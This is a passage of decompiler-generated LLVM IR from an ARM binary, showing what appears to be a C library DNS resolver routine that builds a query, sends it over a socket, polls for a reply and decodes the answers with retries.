  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_18cdc.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_192f8.backedge ]
  %v7_18ce0 = icmp eq i32 %v1_18ce4, -1
  br i1 %v7_18ce0, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_18cdc
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_18cdc, %bb199
  %v1_18ce8 = xor i1 %v7_18ce0, true
  call void @__pseudo_cond_branch(i1 %v1_18ce8, i32 ptrtoint (i32* @global_var_12e38.1138 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_18cf4, i32* @r4, align 4
  %v0_18cf8 = load i32, i32* @r7, align 4
  %v2_18cfc = inttoptr i32 %v0_18cf8 to i8*
  %v3_18cfc = call i32 @__GI_memset(i8* %v2_18cfc, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_18d0c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_18d10 = load i32, i32* @sb, align 4
  %v1_18d10 = add i32 %v0_18d10, 1
  %v3_18d18 = urem i32 %v1_18d10, 65536
  store i32 %v3_18d18, i32* @sb, align 4
  %v0_18d24 = load i32, i32* @r7, align 4
  %v5_18d30 = trunc i32 %v1_18d10 to i8
  store i8 %v5_18d30, i8* %stack_var_-188, align 1
  %v7_18d38 = call i32 @__encode_header(i32* %v6_18d38, i32 %v0_18d24, i32 512, i32 1, i32 %v1_18d10)
  store i32 %v7_18d38, i32* @r5, align 4
  %v1_18d3c = icmp slt i32 %v7_18d38, 0
  br i1 %v1_18d3c, label %dec_label_pc_19314, label %dec_label_pc_18d44

dec_label_pc_18d44:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_18d4c = load i32, i32* %stack_var_-236, align 4
  %v4_18d50 = call i32 @strncpy(i32 %v2_18d4c, i32 %tmp, i32 1025)
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_18d68 = call i32 @__pthread_return_void()
  %v1_18d78 = call i32 @__pthread_return_0()
  %v1_18d88 = load i32, i32* @sl, align 4
  %v4_18d88 = mul i32 %v1_18d88, 4
  %v5_18d88 = add i32 %v4_18d88, %arg4
  %v6_18d88 = inttoptr i32 %v5_18d88 to i32*
  %v7_18d88 = load i32, i32* %v6_18d88, align 4
  store i32 %v7_18d88, i32* @r6, align 4
  br i1 %v1_18d84, label %dec_label_pc_18dcc, label %dec_label_pc_18d90

dec_label_pc_18d90:                               ; preds = %dec_label_pc_18d44
  %v2_18d98 = load i32, i32* @global_var_2cba8.1141, align 4
  %v6_18da0 = icmp slt i32 %v6_192bc, %v2_18d98
  br i1 %v6_18da0, label %dec_label_pc_18da4, label %dec_label_pc_18dcc

dec_label_pc_18da4:                               ; preds = %dec_label_pc_18d90
  store i32 ptrtoint (i32* @global_var_1e200.1143 to i32), i32* @r1, align 4
  %v2_18dac = load i32, i32* %stack_var_-236, align 4
  %v4_18db0 = inttoptr i32 %v2_18dac to i8*
  %v5_18db0 = call i32 @__GI_strncat(i8* %v4_18db0, i32 ptrtoint (i32* @global_var_1e200.1143 to i32), i32 1025, i32 %v2_18d98)
  %v7_18dc0 = load i32, i32* %v6_18dc0, align 4
  store i32 %v7_18dc0, i32* @r1, align 4
  %v4_18dc8 = inttoptr i32 %v2_18dac to i8*
  %v5_18dc8 = call i32 @__GI_strncat(i8* %v4_18dc8, i32 %v7_18dc0, i32 1025, i32 ptrtoint (i32* @global_var_2cb88.1145 to i32))
  br label %dec_label_pc_18dcc

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18d90, %dec_label_pc_18d44, %dec_label_pc_18da4
  store i32 %v2_18c58, i32* @r0, align 4
  store i32 101856, i32* @lr, align 4
  %v1_18ddc = call i32 @__pthread_return_void()
  %v2_18de8 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_18de8, i32* %stack_var_-56, align 4
  %v0_18df8 = load i32, i32* @r7, align 4
  %v1_18df8 = load i32, i32* @r5, align 4
  %v2_18df8 = add i32 %v1_18df8, %v0_18df8
  %v1_18dfc = sub i32 512, %v1_18df8
  %v8_18e04 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_18df8, i32 %v1_18dfc, i32 %arg2, i32 %v2_18de8, i32 %arg2, i32 1)
  store i32 %v8_18e04, i32* @fp, align 4
  %v1_18e08 = icmp slt i32 %v8_18e04, 0
  br i1 %v1_18e08, label %dec_label_pc_19314, label %dec_label_pc_18e10

dec_label_pc_18e10:                               ; preds = %dec_label_pc_18dcc
  store i32 0, i32* @r4, align 4
  %v0_18e20 = load i32, i32* @r6, align 4
  store i8 2, i8* %stack_var_-100, align 1
  %v3_18e2c = inttoptr i32 %v0_18e20 to i8*
  %v4_18e2c = call i32 @inet_pton(i32 10, i8* %v3_18e2c, i32 %v2_18e18)
  %v1_18e30 = load i32, i32* @r4, align 4
  %v7_18e34 = icmp sgt i32 %v4_18e2c, %v1_18e30
  br i1 %v7_18e34, label %bb201, label %dec_label_pc_18e10..thread11_crit_edge

dec_label_pc_18e10..thread11_crit_edge:           ; preds = %dec_label_pc_18e10
  %v3_18e40.pre = load i8, i8* %stack_var_-100, align 1
  br label %.thread11

bb201:                                            ; preds = %dec_label_pc_18e10
  store i8 10, i8* %stack_var_-100, align 1
  br label %.thread11

.thread11:                                        ; preds = %dec_label_pc_18e10..thread11_crit_edge, %bb201
  %v3_18e40 = phi i8 [ %v3_18e40.pre, %dec_label_pc_18e10..thread11_crit_edge ], [ 10, %bb201 ]
  %v4_18e40 = sext i8 %v3_18e40 to i32
  %v8_18e3c.op = urem i32 %v1_18e30, 256
  %v8_18e3c.op.op = mul nuw nsw i32 %v8_18e3c.op, 256
  %v4_18e48 = select i1 %v7_18e34, i32 %v8_18e3c.op.op, i32 0
  %v5_18e48 = or i32 %v4_18e40, %v4_18e48
  %v7_18e4c = icmp eq i32 %v5_18e48, 10
  br i1 %v7_18e4c, label %dec_label_pc_18e78, label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %.thread11
  %v0_18e64 = load i32, i32* @r6, align 4
  store i32 %v0_18e64, i32* @r0, align 4
  %v1_18e70 = call i32 @inet_addr(i32 %v0_18e64)
  br label %dec_label_pc_18e78

dec_label_pc_18e78:                               ; preds = %.thread11, %dec_label_pc_18e60
  %v0_18e8c = call i32 @socket()
  %v1_18e90 = icmp slt i32 %v0_18e8c, 0
  br i1 %v1_18e90, label %.thread, label %dec_label_pc_18ea8

.thread:                                          ; preds = %dec_label_pc_18e78
  br label %dec_label_pc_192f8.backedge

dec_label_pc_192f8.backedge:                      ; preds = %.thread, %.thread13
  %stack_var_-208.5.be = add i32 %stack_var_-208.567, 1
  %tmp293 = icmp ult i32 %stack_var_-208.5.be, 3
  br i1 %tmp293, label %dec_label_pc_18cdc, label %dec_label_pc_19314

dec_label_pc_18ea8:                               ; preds = %dec_label_pc_18e78
  %v4_18eb0 = call i32 @__libc_connect(i32 %v0_18e8c, %sockaddr* nonnull %v3_18eb0, i32 28)
  %v1_18eb4 = icmp slt i32 %v4_18eb0, 0
  br i1 %v1_18eb4, label %dec_label_pc_18ebc, label %dec_label_pc_18edc

dec_label_pc_18ebc:                               ; preds = %dec_label_pc_18ea8
  %v0_18ebc = call i32 @__errno_location()
  %v1_18ec0 = inttoptr i32 %v0_18ebc to i32*
  %v2_18ec0 = load i32, i32* %v1_18ec0, align 4
  %v7_18ec4 = icmp eq i32 %v2_18ec0, 101
  br i1 %v7_18ec4, label %dec_label_pc_19228, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_18ebc
  br label %dec_label_pc_192f8.backedge

dec_label_pc_18edc:                               ; preds = %dec_label_pc_18ea8
  %v0_18edc = load i32, i32* @r5, align 4
  %v1_18edc = load i32, i32* @fp, align 4
  %v2_18edc = add i32 %v1_18edc, %v0_18edc
  %v0_18ee0 = load i32, i32* @r7, align 4
  %v4_18eec = inttoptr i32 %v0_18ee0 to i32*
  %v5_18eec = call i32 @__libc_send(i32 %v0_18e8c, i32* %v4_18eec, i32 %v2_18edc, i32 0)
  store i32 0, i32* @r4, align 4
  store i32 %v0_18e8c, i32* %stack_var_-44, align 4
  %v11_18f14 = call i32 @__libc_poll(%pollfd* %v10_18f14, i32 1, i32 10000, i32 1, i32 %v0_18e8c, i32 1, i32 0)
  %v1_18f18 = load i32, i32* @r4, align 4
  %v7_18f1c = icmp sgt i32 %v11_18f14, %v1_18f18
  br i1 %v7_18f1c, label %dec_label_pc_18f20, label %dec_label_pc_19228

dec_label_pc_18f20:                               ; preds = %dec_label_pc_18edc
  %v0_18f28 = load i32, i32* @r7, align 4
  %v5_18f30 = inttoptr i32 %v0_18f28 to i32*
  %v6_18f30 = call i32 @__libc_recv(i32 %v0_18e8c, i32* %v5_18f30, i32 512, i32 %v1_18f18, i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_18f30, i32* @fp, align 4
  %v7_18f3c = icmp slt i32 %v6_18f30, 12
  br i1 %v7_18f3c, label %dec_label_pc_1925c, label %dec_label_pc_18f40

dec_label_pc_18f40:                               ; preds = %dec_label_pc_18f20
  %v0_18f40 = load i32, i32* @r7, align 4
  %v2_18f48 = inttoptr i32 %v0_18f40 to i8*
  %v3_18f48 = call i32 @__decode_header(i8* %v2_18f48, i32 %v2_18cf4)
  %v3_18f4c = load i8, i8* %stack_var_-188, align 1
  %v4_18f4c = sext i8 %v3_18f4c to i32
  store i32 %v4_18f4c, i32* @r6, align 4
  %v1_18f50 = load i32, i32* @sb, align 4
  %v9_18f50 = icmp eq i32 %v4_18f4c, %v1_18f50
  br i1 %v9_18f50, label %dec_label_pc_18f58, label %dec_label_pc_1925c

dec_label_pc_18f58:                               ; preds = %dec_label_pc_18f40
  %v1_18f5c = load i32, i32* @r4, align 4
  %v9_18f5c = icmp eq i32 %tmp157, %v1_18f5c
  br i1 %v9_18f5c, label %dec_label_pc_1925c, label %dec_label_pc_18f64

dec_label_pc_18f64:                               ; preds = %dec_label_pc_18f58
  br i1 %v7_18f68, label %dec_label_pc_18f70, label %dec_label_pc_18fec

dec_label_pc_18f70:                               ; preds = %dec_label_pc_18f64
  %v9_18f74 = icmp eq i32 %., %v1_18f5c
  br i1 %v9_18f74, label %dec_label_pc_18f7c, label %dec_label_pc_18fe0

dec_label_pc_18f7c:                               ; preds = %dec_label_pc_18f70
  store i32 %v2_18c58, i32* @r5, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_18f94 = call i32 @__pthread_return_void()
  %v1_18fa4 = call i32 @__pthread_return_0()
  store i32 %v2_18c58, i32* @r0, align 4
  %v2_18fb0 = load i32, i32* @global_var_2cba8.1141, align 4
  %v1_18fc0 = call i32 @__pthread_return_void()
  %v1_18fc8 = add i32 %v2_18fb0, -1
  store i32 %v1_18fc8, i32* @r4, align 4
  %v5_18fd0 = icmp slt i32 %v6_192bc, %v1_18fc8
  br i1 %v5_18fd0, label %.thread19, label %dec_label_pc_18fe0

.thread19:                                        ; preds = %dec_label_pc_18f7c
  %v7_18fd0 = add i32 %v6_192bc, 1
  %v6_18fd4 = load i32, i32* @r6, align 4
  store i32 %v6_18fd4, i32* @sb, align 4
  br label %dec_label_pc_192f8.outer.backedge

dec_label_pc_18fe0:                               ; preds = %dec_label_pc_18f7c, %dec_label_pc_18f70
  %v0_18fe0 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19010

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18f64
  br i1 %v2_18fec, label %dec_label_pc_18ff4, label %dec_label_pc_1925c

dec_label_pc_18ff4:                               ; preds = %dec_label_pc_18fec
  br i1 %tmp198, label %dec_label_pc_19008, label %dec_label_pc_19020.preheader

dec_label_pc_19020.preheader:                     ; preds = %dec_label_pc_18ff4
  store i32 12, i32* @r5, align 4
  br label %dec_label_pc_19020

dec_label_pc_19008:                               ; preds = %dec_label_pc_18ff4
  %v0_19008 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_19010

dec_label_pc_19010:                               ; preds = %dec_label_pc_18fe0, %dec_label_pc_19008
  %storemerge4 = phi i32 [ %v0_19008, %dec_label_pc_19008 ], [ %v0_18fe0, %dec_label_pc_18fe0 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_19008 ], [ 1, %dec_label_pc_18fe0 ]
  %v2_19010 = inttoptr i32 %storemerge4 to i32*
  store i32 %storemerge, i32* %v2_19010, align 4
  br label %dec_label_pc_19324

dec_label_pc_19018:                               ; preds = %dec_label_pc_19020
  %v2_19018 = call i32 @__length_question(i32 %v0_1902c, i32 %v0_19028)
  %v0_1901c = load i32, i32* @r5, align 4
  %v2_1901c = add i32 %v0_1901c, %v2_19018
  store i32 %v2_1901c, i32* @r5, align 4
  %v0_19024.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_19020

dec_label_pc_19020:                               ; preds = %dec_label_pc_19020.preheader, %dec_label_pc_19018
  %v0_19028 = phi i32 [ 12, %dec_label_pc_19020.preheader ], [ %v2_1901c, %dec_label_pc_19018 ]
  %v0_19030 = phi i32 [ 0, %dec_label_pc_19020.preheader ], [ %v0_19024.pre, %dec_label_pc_19018 ]
  store i32 %v0_19028, i32* @r1, align 4
  %v0_1902c = load i32, i32* @r7, align 4
  store i32 %v0_1902c, i32* @r0, align 4
  %v1_19030 = add i32 %v0_19030, 1
  store i32 %v1_19030, i32* @r4, align 4
  %v5_19034 = icmp slt i32 %v0_19030, 1
  br i1 %v5_19034, label %dec_label_pc_19018, label %dec_label_pc_19038

dec_label_pc_19038:                               ; preds = %dec_label_pc_19020
  br label %dec_label_pc_19194

dec_label_pc_1904c:                               ; preds = %bb205
  store i32 %v2_1904c, i32* @r4, align 4
  %v0_19050 = load i32, i32* @r7, align 4
  %v0_19058 = load i32, i32* @fp, align 4
  %v5_19060 = call i32 @__decode_answer(i32 %v0_19050, i32 %v0_19054, i32 %v0_19058, i32* nonnull %stack_var_-140)
  %v1_19064 = icmp slt i32 %v5_19060, 0
  br i1 %v1_19064, label %dec_label_pc_19070, label %dec_label_pc_1908c

dec_label_pc_19070:                               ; preds = %dec_label_pc_1904c
  %v2_19074 = icmp eq i32 %stack_var_-192.0, 0
  br i1 %v2_19074, label %dec_label_pc_1925c, label %dec_label_pc_1907c

dec_label_pc_1907c:                               ; preds = %dec_label_pc_19070
  br i1 %v2_19080, label %dec_label_pc_1925c, label %dec_label_pc_191a8

dec_label_pc_1908c:                               ; preds = %dec_label_pc_1904c
  %v2_19090 = icmp eq i32 %stack_var_-212.2, 0
  br i1 %v2_19090, label %dec_label_pc_19134, label %dec_label_pc_19098

dec_label_pc_19098:                               ; preds = %dec_label_pc_1908c
  %v0_19098 = load i32, i32* @r8, align 4
  %v6_1909c = add i32 %v0_19098, 36
  %v7_1909c = inttoptr i32 %v6_1909c to i32*
  %v8_1909c = load i32, i32* %v7_1909c, align 4
  store i32 %v8_1909c, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v2_1904c, i32* @r1, align 4
  store i32 %v0_19098, i32* @r0, align 4
  %v0_190b8 = call i32 @memcpy()
  %v0_190bc = load i32, i32* @r8, align 4
  %v1_190bc = add i32 %v0_190bc, 4
  %v2_190bc = inttoptr i32 %v1_190bc to i32*
  %v3_190bc = load i32, i32* %v2_190bc, align 4
  %v7_190c0 = icmp eq i32 %v3_190bc, 24
  br i1 %v7_190c0, label %dec_label_pc_190e4, label %dec_label_pc_190c8

dec_label_pc_190c8:                               ; preds = %dec_label_pc_19098
  %v1_190c8 = add i32 %v0_190bc, 28
  %v2_190c8 = inttoptr i32 %v1_190c8 to i32*
  %v3_190c8 = load i32, i32* %v2_190c8, align 4
  %v2_190cc = icmp eq i32 %v3_190c8, 0
  br i1 %v2_190cc, label %dec_label_pc_191a8, label %dec_label_pc_190d4

dec_label_pc_190d4:                               ; preds = %dec_label_pc_190c8
  br i1 %v7_190d8, label %dec_label_pc_190e4, label %bb203

bb203:                                            ; preds = %dec_label_pc_190d4
  br i1 %v8_190dc, label %dec_label_pc_190e4, label %dec_label_pc_191a8

dec_label_pc_190e4:                               ; preds = %dec_label_pc_190d4, %bb203, %dec_label_pc_19098
  %v9_190e8 = icmp eq i32 %v3_190bc, %arg2
  br i1 %v9_190e8, label %dec_label_pc_190fc, label %dec_label_pc_190f0

dec_label_pc_190f0:                               ; preds = %dec_label_pc_190e4
  %v1_190f0 = inttoptr i32 %v0_190bc to i32*
  %v2_190f0 = load i32, i32* %v1_190f0, align 4
  store i32 %v2_190f0, i32* @r0, align 4
  %v0_190f4 = call i32 @free()
  br label %dec_label_pc_19180

dec_label_pc_190fc:                               ; preds = %dec_label_pc_190e4
  %v1_19104 = add i32 %v0_190bc, 16
  %v2_19104 = inttoptr i32 %v1_19104 to i32*
  %v3_19104 = load i32, i32* %v2_19104, align 4
  %v2_19108 = sub i32 %tmp155, %stack_var_-192.0
  %v1_1910c = add i32 %v2_19108, -1
  %v1_19110 = add i32 %v3_19104, 4
  %v2_19114 = mul i32 %v1_19110, %v1_1910c
  %v1_19118 = add i32 %v0_190bc, 32
  %v2_19118 = inttoptr i32 %v1_19118 to i32*
  %v3_19118 = load i32, i32* %v2_19118, align 4
  %v2_19120 = add i32 %v0_190bc, 36
  %v3_19120 = inttoptr i32 %v2_19120 to i32*
  store i32 %v1_1910c, i32* %v3_19120, align 4
  %tmp294 = icmp ugt i32 %v2_19114, %v3_19118
  br i1 %tmp294, label %dec_label_pc_191a8, label %dec_label_pc_190fc.dec_label_pc_1917c_crit_edge

dec_label_pc_190fc.dec_label_pc_1917c_crit_edge:  ; preds = %dec_label_pc_190fc
  %v1_1917c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1917c

dec_label_pc_19134:                               ; preds = %dec_label_pc_1908c
  %v3_19134 = load i32, i32* %stack_var_-140, align 4
  store i32 %v3_19134, i32* @r0, align 4
  %v0_19138 = call i32 @free()
  br i1 %v9_19144, label %dec_label_pc_1914c, label %dec_label_pc_19180

dec_label_pc_1914c:                               ; preds = %dec_label_pc_19134
  %v0_1914c = load i32, i32* @r8, align 4
  %v1_1914c = add i32 %v0_1914c, 16
  %v2_1914c = inttoptr i32 %v1_1914c to i32*
  %v3_1914c = load i32, i32* %v2_1914c, align 4
  %v9_19154 = icmp eq i32 %v3_1914c, %tmp146
  br i1 %v9_19154, label %dec_label_pc_1915c, label %dec_label_pc_19254

dec_label_pc_1915c:                               ; preds = %dec_label_pc_1914c
  %v1_1915c = add i32 %v0_1914c, 36
  %v2_1915c = inttoptr i32 %v1_1915c to i32*
  %v3_1915c = load i32, i32* %v2_1915c, align 4
  %v1_19160 = add i32 %v0_1914c, 28
  %v2_19160 = inttoptr i32 %v1_19160 to i32*
  %v3_19160 = load i32, i32* %v2_19160, align 4
  %v3_19164 = mul i32 %v3_1915c, %tmp146
  %v4_19164 = add i32 %v3_19160, %v3_19164
  store i32 %v4_19164, i32* @r0, align 4
  store i32 %tmp146, i32* @r2, align 4
  %v0_19170 = call i32 @memcpy()
  %v0_19174 = load i32, i32* @r8, align 4
  %v1_19174 = add i32 %v0_19174, 36
  %v2_19174 = inttoptr i32 %v1_19174 to i32*
  %v3_19174 = load i32, i32* %v2_19174, align 4
  %v1_19178 = add i32 %v3_19174, 1
  br label %dec_label_pc_1917c

dec_label_pc_1917c:                               ; preds = %dec_label_pc_190fc.dec_label_pc_1917c_crit_edge, %dec_label_pc_1915c
  %v1_1917c = phi i32 [ %v0_19174, %dec_label_pc_1915c ], [ %v1_1917c.pre, %dec_label_pc_190fc.dec_label_pc_1917c_crit_edge ]
  %storemerge5 = phi i32 [ %v1_19178, %dec_label_pc_1915c ], [ 0, %dec_label_pc_190fc.dec_label_pc_1917c_crit_edge ]
  %v2_1917c = add i32 %v1_1917c, 36
  %v3_1917c = inttoptr i32 %v2_1917c to i32*
  store i32 %storemerge5, i32* %v3_1917c, align 4
  br label %dec_label_pc_19180

dec_label_pc_19180:                               ; preds = %dec_label_pc_19134, %dec_label_pc_190f0, %dec_label_pc_1917c
  %stack_var_-212.1 = phi i32 [ 0, %dec_label_pc_1917c ], [ 0, %dec_label_pc_19134 ], [ %stack_var_-212.2, %dec_label_pc_190f0 ]
  %v1_19188 = add i32 %stack_var_-192.0, 1
  %v0_19190 = load i32, i32* @r5, align 4
  %v2_19190 = add i32 %v0_19190, %v5_19060
  store i32 %v2_19190, i32* @r5, align 4
  br label %dec_label_pc_19194

dec_label_pc_19194:                               ; preds = %dec_label_pc_19038, %dec_label_pc_19180
  %v0_19054 = phi i32 [ %v0_19028, %dec_label_pc_19038 ], [ %v2_19190, %dec_label_pc_19180 ]
  %stack_var_-212.2 = phi i32 [ 1, %dec_label_pc_19038 ], [ %stack_var_-212.1, %dec_label_pc_19180 ]
  %stack_var_-192.0 = phi i32 [ 0, %dec_label_pc_19038 ], [ %v1_19188, %dec_label_pc_19180 ]
  %v2_1919c = sub i32 %stack_var_-192.0, %tmp155
  %v4_1919c = xor i32 %stack_var_-192.0, %tmp155
  %v5_1919c = xor i32 %v2_1919c, %stack_var_-192.0
  %v6_1919c = and i32 %v5_1919c, %v4_1919c
  %v5_191a0 = icmp slt i32 %stack_var_-192.0, %tmp155
  br i1 %v5_191a0, label %bb204, label %bb205

bb204:                                            ; preds = %dec_label_pc_19194
  %v7_191a0 = load i32, i32* @fp, align 4
  %v8_191a0 = sub i32 %v0_19054, %v7_191a0
  %v10_191a0 = xor i32 %v7_191a0, %v0_19054
  %v11_191a0 = xor i32 %v8_191a0, %v0_19054
  %v12_191a0 = and i32 %v11_191a0, %v10_191a0
  br label %bb205

bb205:                                            ; preds = %dec_label_pc_19194, %bb204
  %v1_191a4.in = phi i32 [ %v6_1919c, %dec_label_pc_19194 ], [ %v12_191a0, %bb204 ]
  %v0_191a4.in = phi i32 [ %v2_1919c, %dec_label_pc_19194 ], [ %v8_191a0, %bb204 ]
  %v0_191a4 = icmp slt i32 %v0_191a4.in, 0
  %v1_191a4 = icmp slt i32 %v1_191a4.in, 0
  %v2_191a4 = xor i1 %v1_191a4, %v0_191a4
  br i1 %v2_191a4, label %dec_label_pc_1904c, label %dec_label_pc_191a8

dec_label_pc_191a8:                               ; preds = %dec_label_pc_1907c, %bb203, %dec_label_pc_190fc, %dec_label_pc_190c8, %bb205
  %v1_191ac = call i32 @__libc_close(i32 %v0_18e8c)
  %v3_191b0 = load i32, i32* %stack_var_0, align 4
  %v2_191b4 = icmp eq i32 %v3_191b0, 0
  br i1 %v2_191b4, label %.thread26, label %bb206

bb206:                                            ; preds = %dec_label_pc_191a8
  %v1_191bc = load i32, i32* @r7, align 4
  %v3_191b8 = inttoptr i32 %v3_191b0 to i32*
  store i32 %v1_191bc, i32* %v3_191b8, align 4
  br label %bb207

.thread26:                                        ; preds = %dec_label_pc_191a8
  br label %bb207

bb207:                                            ; preds = %bb206, %.thread26
  store i32 102852, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_191b4, i32 ptrtoint (i32* @global_var_15f30.855 to i32))
  %v2_191c4 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_191c4, i32* @r0, align 4
  store i32 %v2_18c58, i32* @r4, align 4
  %v0_191cc = call i32 @free()
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_191e4 = call i32 @__pthread_return_void()
  %v1_191f4 = call i32 @__pthread_return_0()
  %v0_19200 = load i32, i32* @r6, align 4
  %v3_19200 = sdiv i32 %v0_19200, 256
  %v0_19204 = load i32, i32* @sl, align 4
  store i32 %v0_19204, i32* @global_var_2cad8.1133, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_19210 = trunc i32 %v3_19200 to i8
  store i8 %v1_19210, i8* @global_var_26829.1136, align 1
  %v1_19214 = trunc i32 %v0_19200 to i8
  store i8 %v1_19214, i8* bitcast (i8** @global_var_26828.1135 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_19224.1147 to i32), i32* @lr, align 4
  %v1_19220 = call i32 @__pthread_return_void()
  %v0_193ac.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_193ac

dec_label_pc_19228:                               ; preds = %dec_label_pc_18ebc, %dec_label_pc_18edc
  %v0_19228 = load i32, i32* @sl, align 4
  %v1_19228 = add i32 %v0_19228, 1
  %v2_19230 = srem i32 %v1_19228, %arg3
  store i32 %v2_19230, i32* @sl, align 4
  %v2_19234 = icmp eq i32 %v2_19230, 0
  br i1 %v2_19234, label %dec_label_pc_1923c, label %dec_label_pc_192f4.backedge

dec_label_pc_1923c:                               ; preds = %dec_label_pc_19228
  %v1_19244 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_192f8.outer.backedge

dec_label_pc_192f8.outer.backedge:                ; preds = %dec_label_pc_1923c, %dec_label_pc_192d8, %.thread19
  %stack_var_-204.1.ph.be = phi i32 [ %v7_18fd0, %.thread19 ], [ -1, %dec_label_pc_192d8 ], [ -1, %dec_label_pc_1923c ]
  %stack_var_-208.5.ph.be = phi i32 [ %stack_var_-208.567, %.thread19 ], [ %v1_192e0, %dec_label_pc_192d8 ], [ %v1_19244, %dec_label_pc_1923c ]
  %tmp295 = icmp ult i32 %stack_var_-208.5.ph.be, 3
  br i1 %tmp295, label %dec_label_pc_18cdc.lr.ph, label %dec_label_pc_19314

dec_label_pc_19254:                               ; preds = %dec_label_pc_1914c
  %v1_19254 = inttoptr i32 %v0_1914c to i32*
  %v2_19254 = load i32, i32* %v1_19254, align 4
  store i32 %v2_19254, i32* @r0, align 4
  %v0_19258 = call i32 @free()
  br label %dec_label_pc_1925c

dec_label_pc_1925c:                               ; preds = %dec_label_pc_18fec, %dec_label_pc_18f40, %dec_label_pc_1907c, %dec_label_pc_19070, %dec_label_pc_18f58, %dec_label_pc_18f20, %dec_label_pc_19254
  br i1 %v2_19260, label %dec_label_pc_19268, label %dec_label_pc_192c4

dec_label_pc_19268:                               ; preds = %dec_label_pc_1925c
  store i32 %v2_18c58, i32* @r5, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_19280 = call i32 @__pthread_return_void()
  %v1_19290 = call i32 @__pthread_return_0()
  %v2_1929c = load i32, i32* @global_var_2cba8.1141, align 4
  store i32 %v2_18c58, i32* @r0, align 4
  %v1_192ac = call i32 @__pthread_return_void()
  %v1_192b4 = add i32 %v2_1929c, -1
  store i32 %v1_192b4, i32* @r4, align 4
  %v5_192bc = icmp slt i32 %v6_192bc, %v1_192b4
  br i1 %v5_192bc, label %.thread27, label %dec_label_pc_192c4

.thread27:                                        ; preds = %dec_label_pc_19268
  %v7_192bc = add i32 %v6_192bc, 1
  br label %dec_label_pc_192f4.backedge

dec_label_pc_192c4:                               ; preds = %dec_label_pc_19268, %dec_label_pc_1925c
  %v0_192c4 = load i32, i32* @sl, align 4
  %v1_192c4 = add i32 %v0_192c4, 1
  %v2_192cc = srem i32 %v1_192c4, %arg3
  store i32 %v2_192cc, i32* @sl, align 4
  %v2_192d0 = icmp eq i32 %v2_192cc, 0
  br i1 %v2_192d0, label %dec_label_pc_192d8, label %dec_label_pc_192f4.backedge

dec_label_pc_192d8:                               ; preds = %dec_label_pc_192c4
  %v1_192e0 = add i32 %stack_var_-208.567, 1
  br label %dec_label_pc_192f8.outer.backedge

dec_label_pc_192f4.backedge:                      ; preds = %dec_label_pc_19228, %dec_label_pc_192c4, %.thread27
  %storemerge87 = phi i32 [ %v7_192bc, %.thread27 ], [ -1, %dec_label_pc_192c4 ], [ -1, %dec_label_pc_19228 ]
  %tmp296 = icmp ult i32 %stack_var_-208.567, 3
  br i1 %tmp296, label %dec_label_pc_18cdc.lr.ph.preheader, label %dec_label_pc_19314

dec_label_pc_18cdc.lr.ph.preheader:               ; preds = %dec_label_pc_18cdc.lr.ph.preheader.lr.ph, %dec_label_pc_192f4.backedge
  %stack_var_-216.0261 = phi i32 [ -1, %dec_label_pc_18cdc.lr.ph.preheader.lr.ph ], [ %v0_18e8c, %dec_label_pc_192f4.backedge ]
  %stack_var_-208.4260 = phi i32 [ %v0_18cd4, %dec_label_pc_18cdc.lr.ph.preheader.lr.ph ], [ %stack_var_-208.567, %dec_label_pc_192f4.backedge ]
  %v0_192f4259 = phi i32 [ -1, %dec_label_pc_18cdc.lr.ph.preheader.lr.ph ], [ %storemerge87, %dec_label_pc_192f4.backedge ]
  br label %dec_label_pc_18cdc.lr.ph

dec_label_pc_18cdc.lr.ph:                         ; preds = %dec_label_pc_18cdc.lr.ph.preheader, %dec_label_pc_192f8.outer.backedge
  %stack_var_-216.1.ph84 = phi i32 [ %v0_18e8c, %dec_label_pc_192f8.outer.backedge ], [ %stack_var_-216.0261, %dec_label_pc_18cdc.lr.ph.preheader ]
  %stack_var_-208.5.ph83 = phi i32 [ %stack_var_-208.5.ph.be, %dec_label_pc_192f8.outer.backedge ], [ %stack_var_-208.4260, %dec_label_pc_18cdc.lr.ph.preheader ]
  %v6_192bc = phi i32 [ %stack_var_-204.1.ph.be, %dec_label_pc_192f8.outer.backedge ], [ %v0_192f4259, %dec_label_pc_18cdc.lr.ph.preheader ]
  %v1_18d84 = icmp slt i32 %v6_192bc, 0
  %v4_18dc0 = mul i32 %v6_192bc, 4
  %v5_18dc0 = add i32 %v4_18dc0, ptrtoint (i32* @global_var_2cb88.1145 to i32)
  %v6_18dc0 = inttoptr i32 %v5_18dc0 to i32*
  br label %dec_label_pc_18cdc

dec_label_pc_19308:                               ; preds = %bb195, %.thread8, %dec_label_pc_18c34, %dec_label_pc_18c28
  store i32 -1, i32* @sl, align 4
  store i32 -1, i32* @sb, align 4
  br label %dec_label_pc_19314

